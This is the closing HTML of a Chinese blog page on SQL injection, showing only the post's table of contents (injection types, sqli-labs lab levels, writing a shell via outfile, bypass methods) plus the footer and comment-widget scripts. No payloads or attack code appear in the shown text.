href="#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">SQL注入基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">3.1.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">常用函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">SQL注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Union%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">Union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.5.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.5.1.</span> <span class="toc-text">Bool盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.5.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">4.8.</span> <span class="toc-text">堆叠注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-%E9%9D%B6%E5%9C%BA"><span class="toc-number">5.</span> <span class="toc-text">sqli-labs 靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">5.1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">5.2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">5.3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">5.4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">5.5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">5.6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">5.7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">5.8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">5.9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">5.10.</span> <span class="toc-text">Less-10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">5.11.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">5.12.</span> <span class="toc-text">Less-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-24"><span class="toc-number">5.13.</span> <span class="toc-text">Less-24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-32"><span class="toc-number">5.14.</span> <span class="toc-text">Less-32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-38"><span class="toc-number">5.15.</span> <span class="toc-text">Less-38</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">6.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#outfile%E5%87%BD%E6%95%B0%E5%86%99shell"><span class="toc-number">6.1.</span> <span class="toc-text">outfile函数写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220630224530797.png)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By LuckyFuture</div><div class="framework-info"><span>Powered by </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">本站部署在<a target="_blank" rel="noopener" href="https://pages.github.com/">GitHub Pages</a>，由<a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">jsDelivr</a>和<a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/">CloudFlare</a>提供CDN加速和安全防护</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadWaline () {
+  function initWaline () {
+    let initData = {
+      el: '#waline-wrap',
+      serverURL: 'https://hexo-comments.vercel.app/',
+      avatar: 'mp',
+      path: location.pathname,
+      emojiCDN: '',
+      emojiMaps: "",
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign(initData, otherData)
+    }
+    
+    const waline = new Waline(initData)
+  }
+
+  if (typeof Waline === 'function') initWaline() 
+  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
+}
+
+if ('Waline' === 'Waline' || !false) {
+  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+  else setTimeout(loadWaline, 0)
+} else {
+  function loadOtherComment () {
+    loadWaline()
+  }
+}</script><script>function loadDisqusjs () {
+  function addDisqusjsCSS () {
+    const ele = document.createElement('link')
+    ele.rel = 'stylesheet'
+    ele.href= 'https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css'
+    document.getElementsByTagName('head')[0].appendChild(ele)
+  }
+
+  function initDisqusjs () {
+    window.DISQUS = null
+    new DisqusJS({
+      shortname: 'luckyfuture',
+      siteName: '',
+      identifier: 'sqli-summary.html',
+      url: 'http://luckyfuture.top/sqli-summary.html',
+      title: 'SQL注入总结',
+      api: 'https://disqus.skk.moe/disqus/',
+      apikey: 'zkchdXXUQFql5yBCEoFFYVoGrCrqnkDmWuirRxGPu6qmzj0i8lHYLa2HiWNus9DQ',
+      nocomment: '',
+      admin: 'LuckyFuture',
+      adminLabel: ''
+    });
+  }
+
+  window.disqusReset = initDisqusjs
+
+  if (window.disqusJsLoad) initDisqusjs()
+  else {
+    addDisqusjsCSS()
+    getScript('https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js').then(initDisqusjs)
+    window.disqusJsLoad = true
+  }
+}
+
+if ('Waline' === 'Disqusjs' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqusjs)
+  else loadDisqusjs()
+}
+else {
+  function loadOtherComment () {
+    loadDisqusjs()
+  }
+}
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>
